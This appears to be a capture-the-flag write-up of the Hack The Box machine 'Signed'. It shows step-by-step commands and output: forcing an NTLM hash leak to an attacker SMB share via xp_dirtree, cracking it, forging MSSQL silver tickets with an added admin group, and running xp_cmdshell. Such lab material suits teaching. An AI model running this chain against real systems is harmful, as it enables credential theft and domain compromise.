---
title: Signed
date: 2026-06-04
ShowToc: true
draft: false
TocOpen: true
tags:
  - blog
  - HTB
  - windows
  - Port1433-Mssql-Login
  - Port1433-Mssql-whoami
  - Port1433-Mssql-permissions
  - Port1433-Mssql-xp-cmdshell-failed
  - Port1433-Mssql-enum-impersonate-failed
  - Port1433-Mssql-xp-dirtree-responder-ntlm
  - Port1433-mssql-Discovery-Host
  - Port1433-Mssql-mssqlclient.py-windows-auth
  - Port1433-Mssql-enum-impersonate-success
  - Port1433-Mssql-Silver-Ticket
  - Port1433-Mssql-Silver-Ticket-admin
  - Port1433-Mssql-xp-cmdshell-success
  - Windows-Privilege-Escalation-Mssql
  - Lateral-Movement-ligolo-Proxy-linux-x86-to-Windows-X86
lastmod: 2026-06-04T08:55:33.067Z
---
# Box Info

{{< htb-info "https://www.hackthebox.com/machines/Signed" >}}

***

As is common in real life Windows penetration tests, you will start the Signed box with credentials for the following account which can be used to access the MSSQL service: scott / Sm230#C5NatH\
10.129.242.173

# Recon

### PORT & IP SCAN

The aggressive Nmap scan against the target host at **10.129.242.173** revealed only a single open port across the entire 65,535 port range: **TCP port 1433**, which is the default port for Microsoft SQL Server (`ms-sql-s`). The scan indicates that the host is up and responding with a TTL of 127, while the remaining 65,534 TCP ports are strictly filtered and dropping packets without a response, strongly suggesting a firewall is actively blocking all other inbound traffic.

```
┌─[✗]─[tester@parrot]─[~/Desktop/HTB/signed]
└──╼ $sudo nmap  -p-  -vv -reason -T 5  -o openPort.txt 10.129.242.173 --min-rate 10000
Warning: The -o option is deprecated. Please use -oN
Starting Nmap 7.95 ( https://nmap.org ) at 2026-06-04 10:49 HKT
Initiating Ping Scan at 10:49
Scanning 10.129.242.173 [4 ports]
Completed Ping Scan at 10:49, 0.28s elapsed (1 total hosts)
Initiating Parallel DNS resolution of 1 host. at 10:49
Completed Parallel DNS resolution of 1 host. at 10:49, 0.00s elapsed
Initiating SYN Stealth Scan at 10:49
Scanning 10.129.242.173 [65535 ports]
Discovered open port 1433/tcp on 10.129.242.173
Discovered open port 1433/tcp on 10.129.242.173
Completed SYN Stealth Scan at 10:50, 20.12s elapsed (65535 total ports)
Nmap scan report for 10.129.242.173
Host is up, received echo-reply ttl 127 (0.30s latency).
Scanned at 2026-06-04 10:49:52 HKT for 20s
Not shown: 65534 filtered tcp ports (no-response)
PORT     STATE SERVICE  REASON
1433/tcp open  ms-sql-s syn-ack ttl 127

Read data files from: /usr/bin/../share/nmap
Nmap done: 1 IP address (1 host up) scanned in 20.52 seconds
           Raw packets sent: 196613 (8.651MB) | Rcvd: 8 (336B)

```

### mssql

{{< toggle "Tag 🏷️" >}}

{{< tag "Port1433-Mssql-Login" >}} Login the target as mssqlclient.py

{{< /toggle >}}

```
┌─[tester@parrot]─[~/Desktop/HTB/signed]
└──╼ $/usr/share/doc/python3-impacket/examples/mssqlclient.py scott:Sm230#C5NatH@10.129.242.173
Impacket v0.12.0 - Copyright Fortra, LLC and its affiliated companies 

[*] Encryption required, switching to TLS
[*] ENVCHANGE(DATABASE): Old Value: master, New Value: master
[*] ENVCHANGE(LANGUAGE): Old Value: , New Value: us_english
[*] ENVCHANGE(PACKETSIZE): Old Value: 4096, New Value: 16192
[*] INFO(DC01): Line 1: Changed database context to 'master'.
[*] INFO(DC01): Line 1: Changed language setting to us_english.
[*] ACK: Result: 1 - Microsoft SQL Server (160 3232) 
[!] Press help for extra shell commands
SQL (scott  guest@master)> 
```

The `@@version` global variable shows the version:

```
SQL (scott  guest@master)> select @@version;
                                                                                                                                                                                                                             
--------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------   
Microsoft SQL Server 2022 (RTM) - 16.0.1000.6 (X64) 
        Oct  8 2022 05:58:25 
        Copyright (C) 2022 Microsoft Corporation
        Developer Edition (64-bit) on Windows Server 2019 Standard 10.0 <X64> (Build 17763: ) (Hypervisor)
   

```

{{< toggle "Tag 🏷️" >}}

{{< tag "Port1433-Mssql-whoami" >}} Identify who in the database now

{{< /toggle >}}

```
SQL (scott  guest@master)> select SUSER_SNAME(), ORIGINAL_LOGIN();
                
-----   -----   
scott   scott   

```

{{< toggle "Tag 🏷️" >}}

{{< tag "Port1433-Mssql-permissions" >}} Knowing what I can do with permission

{{< /toggle >}}

`ORIGINAL_LOGIN()` gives the user who authenticated to MSSQL, and `SUSER_SNAME()` gives the user mapped into the current security context. In this case, they are the same, but it is possible that logging in with one account will map to another user within MSSQL. To explicitly see permissions, I can check both the server and the database level permissions:

```
SQL (scott  guest@master)> select * from fn_my_permissions(NULL, 'SERVER');
entity_name   subentity_name   permission_name     
-----------   --------------   -----------------   
server                         CONNECT SQL         

server                         VIEW ANY DATABASE   

SQL (scott  guest@master)> SELECT * FROM fn_my_permissions(NULL, 'DATABASE');
entity_name   subentity_name   permission_name                             
-----------   --------------   -----------------------------------------   
database                       CONNECT                                     

database                       VIEW ANY COLUMN ENCRYPTION KEY DEFINITION   

database                       VIEW ANY COLUMN MASTER KEY DEFINITION    
```

The databases are just the default DBs:

```
SQL (scott  guest@master)> SELECT name FROM sys.databases;
name     
------   
master   

tempdb   

model    

msdb   
```

{{< toggle "Tag 🏷️" >}}

{{< tag "Port1433-Mssql-xp-cmdshell-failed" >}} The example of xp\_cmdshell failed and disabled on mssql

{{< /toggle >}}

Without any interesting data to look at, I’ll check for `xp_cmdshell`:

```
SQL (scott  guest@master)> xp_cmdshell whoami
ERROR(DC01): Line 1: The EXECUTE permission was denied on the object 'xp_cmdshell', database 'mssqlsystemresource', schema 'sys'.
SQL (scott  guest@master)> enable_xp_cmdshell
ERROR(DC01): Line 105: User does not have permission to perform this action.
ERROR(DC01): Line 1: You do not have permission to run the RECONFIGURE statement.
ERROR(DC01): Line 62: The configuration option 'xp_cmdshell' does not exist, or it may be an advanced option.
ERROR(DC01): Line 1: You do not have permission to run the RECONFIGURE statement.

```

It’s disabled, and scott doesn’t have permissions to enable it.

I’ll check for impersonation and linked servers, but neither show anything interesting:

{{< toggle "Tag 🏷️" >}}

{{< tag "Port1433-Mssql-enum-impersonate-failed" >}} The example of enum\_impersonate failed and disabled with that user

{{< /toggle >}}

```
SQL (scott  guest@master)> enum_impersonate
execute as   database   permission_name   state_desc   grantee   grantor   
----------   --------   ---------------   ----------   -------   -------   
SQL (scott  guest@master)> enum_links
SRV_NAME   SRV_PROVIDERNAME   SRV_PRODUCT   SRV_DATASOURCE   SRV_PROVIDERSTRING   SRV_LOCATION   SRV_CAT   
--------   ----------------   -----------   --------------   ------------------   ------------   -------   
DC01       SQLNCLI            SQL Server    DC01             NULL                 NULL           NULL      

Linked Server   Local Login   Is Self Mapping   Remote Login   
-------------   -----------   ---------------   ------------   

```

Listing the logins, it’s just scott and the sa (admin) account:

```
SQL (scott  guest@master)> enum_logins
name    type_desc   is_disabled   sysadmin   securityadmin   serveradmin   setupadmin   processadmin   diskadmin   dbcreator   bulkadmin   
-----   ---------   -----------   --------   -------------   -----------   ----------   ------------   ---------   ---------   ---------   
sa      SQL_LOGIN             0          1               0             0            0              0           0           0           0   

scott   SQL_LOGIN             0          0               0             0            0              0           0           0           0   

```

`xp_dirtree` will let me enumerate the filesystem. I can try to read the contents of `C:\`:

```
SQL (scott  guest@master)> xp_dirtree "C:\"
subdirectory   depth   file   
------------   -----   ----   
```

MSSQL provides the mechanism to get information about domain users. For example, I can look up the SID for the domain Administrator account:

```
SQL (scott  guest@master)> SELECT SUSER_SID('SIGNED\Administrator');
                                                              
-----------------------------------------------------------   
b'0105000000000005150000005b7bb0f398aa2245ad4a1ca4f4010000'   

```

I can also go the other way:

```
SQL (scott  guest@master)> SELECT SUSER_SNAME(0x0105000000000005150000005b7bb0f398aa2245ad4a1ca4f4010000);
                       
--------------------   
SIGNED\Administrator   

```

This SID is in binary format, but the 0xf4010000 is RID 500 in little-endian hex. If I want to see who has 501 (0xf5010000), MSSQL will show:

```
SQL (scott  guest@master)> SELECT SUSER_SNAME(0x0105000000000005150000005b7bb0f398aa2245ad4a1ca4f5010000);
               
------------   
SIGNED\Guest   

```

### Auth as mssqlsvc

{{< toggle "Tag 🏷️" >}}

{{< tag "Port1433-Mssql-xp-dirtree-responder-ntlm" >}} Using the mssql 's xp\_dirtree function to list our server share 's responder tools to do the RFL to have the hashes

{{< /toggle >}}

`xp_dirtree` will let me enumerate the filesystem. I can try to read the contents of `C:\`:

```
SQL (scott  guest@master)> xp_dirtree "C:\"
subdirectory   depth   file   
------------   -----   ----   
```

I’m going to use `xp_dirtree` to try to list a directory from an SMB share I control. That will cause MSSQL to try to authenticate to my share (using the service account that MSSQL is running under), where I can capture the NetNTLMv2 challenge / response (hash) and try to crack it. I’ll start [Responder](https://github.com/lgandx/Responder):

```
SQL (scott  guest@master)> xp_dirtree \\10.10.16.128\share
subdirectory   depth   file   
------------   -----   ----  
```

```
[+] Poisoning Options:
    Analyze Mode               [OFF]
    Force WPAD auth            [OFF]
    Force Basic Auth           [OFF]
    Force LM downgrade         [OFF]
    Force ESS downgrade        [OFF]

[+] Generic Options:
    Responder NIC              [tun0]
    Responder IP               [10.10.16.128]
    Responder IPv6             [dead:beef:4::107e]
    Challenge set              [random]
    Don't Respond To Names     ['ISATAP']

[+] Current Session Variables:
    Responder Machine Name     [WIN-W3ZXZ1CTV76]
    Responder Domain Name      [KR56.LOCAL]
    Responder DCE-RPC Port     [48185]

[+] Listening for events...

/usr/share/responder/packets.py:218: SyntaxWarning: invalid escape sequence '\W'
  SplitFQDN =  re.split('\W+', DNSName) # split the ldap.tcp.blah.blah.blah.domain.tld
/usr/share/responder/servers/SMB.py:212: SyntaxWarning: invalid escape sequence '\?'
  if data[8:10] == b"\x72\x00" and re.search(b"SMB 2.\?\?\?", data):
/usr/share/responder/servers/SMB.py:250: SyntaxWarning: invalid escape sequence '\?'
  if data[8:10] == b'\x72\x00' and data[4:5] == b'\xff' and re.search(b'SMB 2.\?\?\?', data) == None:
[!] Error starting SSL server on port 5986, check permissions or other servers running.
[!] Error starting SSL server on port 443, check permissions or other servers running.
^[[A^[[A^[[A^[[A^[[A^[[A^[[A^[[A^[[A^[[A^[[A^[[A^[[A^[[A^[[A^[[A^[[A^[[A^[[A^[[A^[[A^[[A^[[A^[[[SMB] NTLMv2-SSP Client   : 10.129.242.173[[B^[[B
[SMB] NTLMv2-SSP Username : SIGNED\mssqlsvc
[SMB] NTLMv2-SSP Hash     : mssqlsvc::SIGNED:7d07f98f6b804540:0D51BEE890F8EDBAAD9643D4EAC7C631:010100000000000080E1B91213F4DC0121979CA1E41B64DB00000000020008004B0052003500360001001E00570049004E002D00570033005A0058005A0031004300540056003700360004003400570049004E002D00570033005A0058005A003100430054005600370036002E004B005200350036002E004C004F00430041004C00030014004B005200350036002E004C004F00430041004C00050014004B005200350036002E004C004F00430041004C000700080080E1B91213F4DC0106000400020000000800300030000000000000000000000000300000C43CF03D946905B2A522C43F1350114953B3FAEE7623DC4064C7A3373547EA9D0A001000000000000000000000000000000000000900220063006900660073002F00310030002E00310030002E00310036002E003100320038000000000000000000

```

```
[+] Generic Options:
    Responder NIC              [tun0]
    Responder IP               [10.10.16.128]
    Responder IPv6             [dead:beef:4::107e]
    Challenge set              [random]
    Don't Respond To Names     ['ISATAP']

[+] Current Session Variables:
    Responder Machine Name     [WIN-W3ZXZ1CTV76]
    Responder Domain Name      [KR56.LOCAL]
    Responder DCE-RPC Port     [48185]

[+] Listening for events...

/usr/share/responder/packets.py:218: SyntaxWarning: invalid escape sequence '\W'
  SplitFQDN =  re.split('\W+', DNSName) # split the ldap.tcp.blah.blah.blah.domain.tld
/usr/share/responder/servers/SMB.py:212: SyntaxWarning: invalid escape sequence '\?'
  if data[8:10] == b"\x72\x00" and re.search(b"SMB 2.\?\?\?", data):
/usr/share/responder/servers/SMB.py:250: SyntaxWarning: invalid escape sequence '\?'
  if data[8:10] == b'\x72\x00' and data[4:5] == b'\xff' and re.search(b'SMB 2.\?\?\?', data) == None:
[!] Error starting SSL server on port 5986, check permissions or other servers running.
[!] Error starting SSL server on port 443, check permissions or other servers running.
^[[A^[[A^[[A^[[A^[[A^[[A^[[A^[[A^[[A^[[A^[[A^[[A^[[A^[[A^[[A^[[A^[[A^[[A^[[A^[[A^[[A^[[A^[[A^[[[SMB] NTLMv2-SSP Client   : 10.129.242.173[[B^[[B
[SMB] NTLMv2-SSP Username : SIGNED\mssqlsvc
[SMB] NTLMv2-SSP Hash     : mssqlsvc::SIGNED:7d07f98f6b804540:0D51BEE890F8EDBAAD9643D4EAC7C631:010100000000000080E1B91213F4DC0121979CA1E41B64DB00000000020008004B0052003500360001001E00570049004E002D00570033005A0058005A0031004300540056003700360004003400570049004E002D00570033005A0058005A003100430054005600370036002E004B005200350036002E004C004F00430041004C00030014004B005200350036002E004C004F00430041004C00050014004B005200350036002E004C004F00430041004C000700080080E1B91213F4DC0106000400020000000800300030000000000000000000000000300000C43CF03D946905B2A522C43F1350114953B3FAEE7623DC4064C7A3373547EA9D0A001000000000000000000000000000000000000900220063006900660073002F00310030002E00310030002E00310036002E003100320038000000000000000000

```

```
┌─[tester@parrot]─[~/Desktop/HTB/signed]
└──╼ $john --format=netntlmv2 --wordlist=/usr/share/wordlists/rockyou.txt mssql.hashes 
Created directory: /home/tester/.john
Using default input encoding: UTF-8
Loaded 1 password hash (netntlmv2, NTLMv2 C/R [MD4 HMAC-MD5 32/64])
Will run 12 OpenMP threads
Press 'q' or Ctrl-C to abort, almost any other key for status
purPLE9795!@     (mssqlsvc)     
1g 0:00:00:03 DONE (2026-06-04 11:20) 0.3125g/s 1403Kp/s 1403Kc/s 1403KC/s purcitititya..punkgod666
Use the "--show --format=netntlmv2" options to display all of the cracked passwords reliably
Session completed. 
```

***

{{< toggle "Tag 🏷️" >}}

{{< tag "Port1433-mssql-Discovery-Host" >}} Found the subdomain in the mssql by select @@SERVERNAME;

{{< /toggle >}}

That output confirms the current server name, DC01, which I can also see with `@@SERVERNAME`:

```
SQL (scott  guest@master)> select @@SERVERNAME;
       
----   
DC01 
```

```
┌─[tester@parrot]─[~/Desktop/HTB/signed]
└──╼ $cat /etc/hosts
# Host addresses
127.0.0.1  localhost
127.0.1.1  parrot
10.129.242.173  DC01.signed.htb signed.htb
::1        localhost ip6-localhost ip6-loopback
ff02::1    ip6-allnodes
ff02::2    ip6-allrouters
# Others
```

```
┌─[tester@parrot]─[~/Desktop/HTB/signed]
└──╼ $for proto in smb winrm wmi rdp ssh ldap mssql ftp; do echo -e "\n[*] Testing $proto..." && netexec $proto DC01.signed.htb  -u 'mssqlsvc' -p 'purPLE9795!@'; done

[*] Testing smb...

[*] Testing winrm...

[*] Testing wmi...

[*] Testing rdp...

[*] Testing ssh...

[*] Testing ldap...
^C^CException ignored in sys.unraisablehook: <built-in function unraisablehook>
KeyboardInterrupt: 

[*] Testing mssql...
MSSQL       10.129.242.173  1433   DC01             [*] Windows 10 / Server 2019 Build 17763 (name:DC01) (domain:SIGNED.HTB) (EncryptionReq:False)
MSSQL       10.129.242.173  1433   DC01             [+] SIGNED.HTB\mssqlsvc:purPLE9795!@ 

[*] Testing ftp...
^C^CException ignored on threading shutdownException ignored in sys.unraisablehook: <built-in function unraisablehook>
KeyboardInterrupt: 
^C
```

### windows

{{< toggle "Tag 🏷️" >}}

{{< tag "Port1433-Mssql-mssqlclient.py-windows-auth" >}} I can connect with `mssqlclient.py`, this time with the `-windows-auth` flag to use a domain account using Windows integrated authentication: in mssql

{{< /toggle >}}

I can connect with `mssqlclient.py`, this time with the `-windows-auth` flag to use a domain account using Windows integrated authentication:

```
┌─[tester@parrot]─[~/Desktop/HTB/signed]
└──╼ $/usr/share/doc/python3-impacket/examples/mssqlclient.py mssqlsvc:'purPLE9795!@'@DC01.signed.htb -windows-auth
Impacket v0.12.0 - Copyright Fortra, LLC and its affiliated companies 

[*] Encryption required, switching to TLS
[*] ENVCHANGE(DATABASE): Old Value: master, New Value: master
[*] ENVCHANGE(LANGUAGE): Old Value: , New Value: us_english
[*] ENVCHANGE(PACKETSIZE): Old Value: 4096, New Value: 16192
[*] INFO(DC01): Line 1: Changed database context to 'master'.
[*] INFO(DC01): Line 1: Changed language setting to us_english.
[*] ACK: Result: 1 - Microsoft SQL Server (160 3232) 
[!] Press help for extra shell commands
SQL (SIGNED\mssqlsvc  guest@master)> 

```

{{< toggle "Tag 🏷️" >}}

{{< tag "Port1433-Mssql-enum\_impersonate-success" >}} There is some impersonation set up, so I can impetrates the user

{{< /toggle >}}

There is some impersonation set up:

```
SQL (SIGNED\mssqlsvc  guest@master)> enum_impersonate
execute as   database   permission_name   state_desc   grantee    grantor                        
----------   --------   ---------------   ----------   --------   ----------------------------   
b'USER'      msdb       IMPERSONATE       GRANT        dc_admin   MS_DataCollectorInternalUser   
```

dc\_admin has been granted IMPERSONATE permission on the MS\_DataCollectorInternalUser user in the msdb database. MS\_DataCollectorInternalUser is a built-in high-privilege account in msdb. The problem is that dc\_admin doesn’t exist as a database user in msdb:

```
SQL (SIGNED\mssqlsvc  guest@master)> enum_logins
name                                type_desc       is_disabled   sysadmin   securityadmin   serveradmin   setupadmin   processadmin   diskadmin   dbcreator   bulkadmin   
---------------------------------   -------------   -----------   --------   -------------   -----------   ----------   ------------   ---------   ---------   ---------   
sa                                  SQL_LOGIN                 0          1               0             0            0              0           0           0           0   

##MS_PolicyEventProcessingLogin##   SQL_LOGIN                 1          0               0             0            0              0           0           0           0   

##MS_PolicyTsqlExecutionLogin##     SQL_LOGIN                 1          0               0             0            0              0           0           0           0   

SIGNED\IT                           WINDOWS_GROUP             0          1               0             0            0              0           0           0           0   

NT SERVICE\SQLWriter                WINDOWS_LOGIN             0          1               0             0            0              0           0           0           0   

NT SERVICE\Winmgmt                  WINDOWS_LOGIN             0          1               0             0            0              0           0           0           0   

NT SERVICE\MSSQLSERVER              WINDOWS_LOGIN             0          1               0             0            0              0           0           0           0   

NT AUTHORITY\SYSTEM                 WINDOWS_LOGIN             0          0               0             0            0              0           0           0           0   

NT SERVICE\SQLSERVERAGENT           WINDOWS_LOGIN             0          1               0             0            0              0           0           0           0   

NT SERVICE\SQLTELEMETRY             WINDOWS_LOGIN             0          0               0             0            0              0           0           0           0   

scott                               SQL_LOGIN                 0          0               0             0            0              0           0           0           0   

SIGNED\Domain Users                 WINDOWS_GROUP             0          0               0             0            0              0           0           0           0   

```

That makes this a bit of a dead end at least for now. However, the `enum_logins` output shows more logins than scott is able to see. In addition to sa, there are five other users who have the sysadmin privileges, and one group, SIGNED\IT.

### Silver Ticket

{{< toggle "Tag 🏷️" >}}

{{< tag "Port1433-Mssql-Silver-Ticket" >}} In the mssql , so i create the Silver ticket on the mssql to have the mssqlsvc.ccache of ccache to login the next mssql

{{< /toggle >}}

#### Background

A silver ticket is a forged Kerberos service ticket (TGS) created using the NTLM hash of a service account. Unlike a golden ticket (which forges a TGT using the krbtgt hash), a silver ticket targets a specific service. In this case, because I have the NTLM hash (or the raw password which makes it trivial to calculate the NTLM hash) of the mssqlsvc account, I can craft service tickets (TGS) for the MSSQL service.

#### TGS as mssqlsvc

I’ll start by proving I can forge a ticket for a user I know, mssqlsvc. To create a ticket, I’ll need:

* The NTLM hash of the service account password.
* The domain SID

To get the NTLM, I’ll use Python with the plaintext password:

```
┌─[tester@parrot]─[~/Desktop]
└──╼ $ python3 -c 'import hashlib; print(hashlib.new("md4", "purPLE9795!@".encode("utf-16le")).hexdigest())'
ef699384c3285c54128a3ee1ddb1a0cc

```

To get the domain SID, I’ll fetch a SID from the DB:

```
SQL (SIGNED\mssqlsvc  guest@master)> SELECT SUSER_SID('SIGNED\Domain Users');
                                                              
-----------------------------------------------------------   
b'0105000000000005150000005b7bb0f398aa2245ad4a1ca401020000'
```

The raw SID is a binary structure in little-endian format. Here’s how to parse it:

| Bytes          | Field                | Value                               |
| -------------- | -------------------- | ----------------------------------- |
| `01`           | Revision             | 1                                   |
| `05`           | Sub-authority count  | 5                                   |
| `000000000005` | Identifier authority | 5 (NT Authority)                    |
| `15000000`     | Sub-auth 1           | 0x00000015 = 21                     |
| `5b7bb0f3`     | Sub-auth 2           | 0xf3b07b5b = 4088429403             |
| `98aa2245`     | Sub-auth 3           | 0x4522aa98 = 1159899800             |
| `ad4a1ca4`     | Sub-auth 4           | 0xa41c4aad = 2753317549             |
| `01020000`     | Sub-auth 5           | 0x00000201 = 513 (Domain Users RID) |

Putting that all together makes S-1-5-21-4088429403-1159899800-2753317549-513, and the domain SID will be that without the RID at the end: S-1-5-21-4088429403-1159899800-2753317549.

```
┌─[tester@parrot]─[~/Desktop]
└──╼ $python 
Python 3.13.5 (main, Apr  6 2026, 12:24:14) [GCC 14.2.0] on linux
Type "help", "copyright", "credits" or "license" for more information.
>>> from impacket.dcerpc.v5.dtypes import SID
>>> SID(bytes.fromhex('0105000000000005150000005b7bb0f398aa2245ad4a1ca401020000')).formatCanonical()
'S-1-5-21-4088429403-1159899800-2753317549-513'

```

Putting that together forges a ticket:

```
┌─[tester@parrot]─[~/Desktop]
└──╼ $/usr/share/doc/python3-impacket/examples/ticketer.py -nthash ef699384c3285c54128a3ee1ddb1a0cc -domain-sid S-1-5-21-4088429403-1159899800-2753317549 -domain signed.htb -spn MSSQLSvc/DC01.signed.htb:1433 mssqlsvc
Impacket v0.12.0 - Copyright Fortra, LLC and its affiliated companies 

[*] Creating basic skeleton ticket and PAC Infos
/usr/share/doc/python3-impacket/examples/ticketer.py:141: DeprecationWarning: datetime.datetime.utcnow() is deprecated and scheduled for removal in a future version. Use timezone-aware objects to represent datetimes in UTC: datetime.datetime.now(datetime.UTC).
  aTime = timegm(datetime.datetime.utcnow().timetuple())
[*] Customizing ticket for signed.htb/mssqlsvc
/usr/share/doc/python3-impacket/examples/ticketer.py:600: DeprecationWarning: datetime.datetime.utcnow() is deprecated and scheduled for removal in a future version. Use timezone-aware objects to represent datetimes in UTC: datetime.datetime.now(datetime.UTC).
  ticketDuration = datetime.datetime.utcnow() + datetime.timedelta(hours=int(self.__options.duration))
/usr/share/doc/python3-impacket/examples/ticketer.py:718: DeprecationWarning: datetime.datetime.utcnow() is deprecated and scheduled for removal in a future version. Use timezone-aware objects to represent datetimes in UTC: datetime.datetime.now(datetime.UTC).
  encTicketPart['authtime'] = KerberosTime.to_asn1(datetime.datetime.utcnow())
/usr/share/doc/python3-impacket/examples/ticketer.py:719: DeprecationWarning: datetime.datetime.utcnow() is deprecated and scheduled for removal in a future version. Use timezone-aware objects to represent datetimes in UTC: datetime.datetime.now(datetime.UTC).
  encTicketPart['starttime'] = KerberosTime.to_asn1(datetime.datetime.utcnow())
[*]     PAC_LOGON_INFO
[*]     PAC_CLIENT_INFO_TYPE
[*]     EncTicketPart
/usr/share/doc/python3-impacket/examples/ticketer.py:843: DeprecationWarning: datetime.datetime.utcnow() is deprecated and scheduled for removal in a future version. Use timezone-aware objects to represent datetimes in UTC: datetime.datetime.now(datetime.UTC).
  encRepPart['last-req'][0]['lr-value'] = KerberosTime.to_asn1(datetime.datetime.utcnow())
[*]     EncTGSRepPart
[*] Signing/Encrypting final ticket
[*]     PAC_SERVER_CHECKSUM
[*]     PAC_PRIVSVR_CHECKSUM
[*]     EncTicketPart
[*]     EncTGSRepPart
[*] Saving ticket in mssqlsvc.ccache

```

I can use that to connect to MSSQL:

```
┌─[tester@parrot]─[~/Desktop]
└──╼ $KRB5CCNAME=mssqlsvc.ccache /usr/share/doc/python3-impacket/examples/mssqlclient.py  -no-pass -k DC01.signed.htb
Impacket v0.12.0 - Copyright Fortra, LLC and its affiliated companies 

[*] Encryption required, switching to TLS
[*] ENVCHANGE(DATABASE): Old Value: master, New Value: master
[*] ENVCHANGE(LANGUAGE): Old Value: , New Value: us_english
[*] ENVCHANGE(PACKETSIZE): Old Value: 4096, New Value: 16192
[*] INFO(DC01): Line 1: Changed database context to 'master'.
[*] INFO(DC01): Line 1: Changed language setting to us_english.
[*] ACK: Result: 1 - Microsoft SQL Server (160 3232) 
[!] Press help for extra shell commands
SQL (SIGNED\Administrator  guest@master)> 

```

It’s as the mssqlsvc user:

```
SQL (SIGNED\Administrator  guest@master)> select SUSER_SNAME(), ORIGINAL_LOGIN();
                                            
-------------------   -------------------   
SIGNED.HTB\mssqlsvc   SIGNED.HTB\mssqlsvc   


```

### TGS with IT Group

{{< toggle "Tag 🏷️" >}}

{{< tag "Port1433-Mssql-Silver-Ticket-admin" >}} The IT group has sysadmin privileges on the database. When a user authenticates using Kerberos, they authenticate to the DC which generates the TGS with all the information about the user, including their groups, and encrypts it with the NTLM of the service account that will receive it. When I’m forging a silver ticket using the service’s NTLM, I can add groups to the forged ticket.

{{< /toggle >}}

```
SQL (SIGNED\Administrator  guest@master)> select SUSER_SID('Signed\IT')
                                                              
-----------------------------------------------------------   
b'0105000000000005150000005b7bb0f398aa2245ad4a1ca451040000' 
```

```
┌─[tester@parrot]─[~/Desktop]
└──╼ $python -c 'print(0x451)'
1105

```

```
┌─[✗]─[tester@parrot]─[~/Desktop]
└──╼ $/usr/share/doc/python3-impacket/examples/ticketer.py -nthash ef699384c3285c54128a3ee1ddb1a0cc -domain-sid S-1-5-21-4088429403-1159899800-2753317549 -domain signed.htb -spn MSSQLSvc/DC01.signed.htb:1433 -groups 1105 Administrator
Impacket v0.12.0 - Copyright Fortra, LLC and its affiliated companies 

[*] Creating basic skeleton ticket and PAC Infos
/usr/share/doc/python3-impacket/examples/ticketer.py:141: DeprecationWarning: datetime.datetime.utcnow() is deprecated and scheduled for removal in a future version. Use timezone-aware objects to represent datetimes in UTC: datetime.datetime.now(datetime.UTC).
  aTime = timegm(datetime.datetime.utcnow().timetuple())
[*] Customizing ticket for signed.htb/Administrator
/usr/share/doc/python3-impacket/examples/ticketer.py:600: DeprecationWarning: datetime.datetime.utcnow() is deprecated and scheduled for removal in a future version. Use timezone-aware objects to represent datetimes in UTC: datetime.datetime.now(datetime.UTC).
  ticketDuration = datetime.datetime.utcnow() + datetime.timedelta(hours=int(self.__options.duration))
/usr/share/doc/python3-impacket/examples/ticketer.py:718: DeprecationWarning: datetime.datetime.utcnow() is deprecated and scheduled for removal in a future version. Use timezone-aware objects to represent datetimes in UTC: datetime.datetime.now(datetime.UTC).
  encTicketPart['authtime'] = KerberosTime.to_asn1(datetime.datetime.utcnow())
/usr/share/doc/python3-impacket/examples/ticketer.py:719: DeprecationWarning: datetime.datetime.utcnow() is deprecated and scheduled for removal in a future version. Use timezone-aware objects to represent datetimes in UTC: datetime.datetime.now(datetime.UTC).
  encTicketPart['starttime'] = KerberosTime.to_asn1(datetime.datetime.utcnow())
[*]     PAC_LOGON_INFO
[*]     PAC_CLIENT_INFO_TYPE
[*]     EncTicketPart
/usr/share/doc/python3-impacket/examples/ticketer.py:843: DeprecationWarning: datetime.datetime.utcnow() is deprecated and scheduled for removal in a future version. Use timezone-aware objects to represent datetimes in UTC: datetime.datetime.now(datetime.UTC).
  encRepPart['last-req'][0]['lr-value'] = KerberosTime.to_asn1(datetime.datetime.utcnow())
[*]     EncTGSRepPart
[*] Signing/Encrypting final ticket
[*]     PAC_SERVER_CHECKSUM
[*]     PAC_PRIVSVR_CHECKSUM
[*]     EncTicketPart
[*]     EncTGSRepPart
[*] Saving ticket in Administrator.ccache

```

And connect:

```
┌─[✗]─[tester@parrot]─[~/Desktop]
└──╼ $KRB5CCNAME=Administrator.ccache  /usr/share/doc/python3-impacket/examples/mssqlclient.py  -no-pass -k DC01.signed.htb
Impacket v0.12.0 - Copyright Fortra, LLC and its affiliated companies 

[*] Encryption required, switching to TLS
[*] ENVCHANGE(DATABASE): Old Value: master, New Value: master
[*] ENVCHANGE(LANGUAGE): Old Value: , New Value: us_english
[*] ENVCHANGE(PACKETSIZE): Old Value: 4096, New Value: 16192
[*] INFO(DC01): Line 1: Changed database context to 'master'.
[*] INFO(DC01): Line 1: Changed language setting to us_english.
[*] ACK: Result: 1 - Microsoft SQL Server (160 3232) 
[!] Press help for extra shell commands
SQL (SIGNED\Administrator  dbo@master)>  select SUSER_SNAME(), ORIGINAL_LOGIN();
                                                      
------------------------   ------------------------   
SIGNED.HTB\Administrator   SIGNED.HTB\Administrator   

```

{{< toggle "Tag 🏷️" >}}

{{< tag "Port1433-Mssql-xp-cmdshell-success" >}} With sysadmin privileges (via the IT group membership), I can enable xp\_cmdshell on mssql do the powershell reverse shell RCE

{{< /toggle >}}

```
SQL (SIGNED\Administrator  dbo@master)> enable_xp_cmdshell
INFO(DC01): Line 196: Configuration option 'show advanced options' changed from 0 to 1. Run the RECONFIGURE statement to install.
INFO(DC01): Line 196: Configuration option 'xp_cmdshell' changed from 0 to 1. Run the RECONFIGURE statement to install.
SQL (SIGNED\Administrator  dbo@master)> xp_cmdshell whoami
output            
---------------   
signed\mssqlsvc   

NULL     
```

```
SQL (SIGNED\Administrator  dbo@master)> xp_cmdshell "type C:\Users\mssqlsvc\Desktop\user.txt"
output                             
--------------------------------   
420be1fad6ba4ce4c025a0975e11cf8b   

NULL                               


```

```
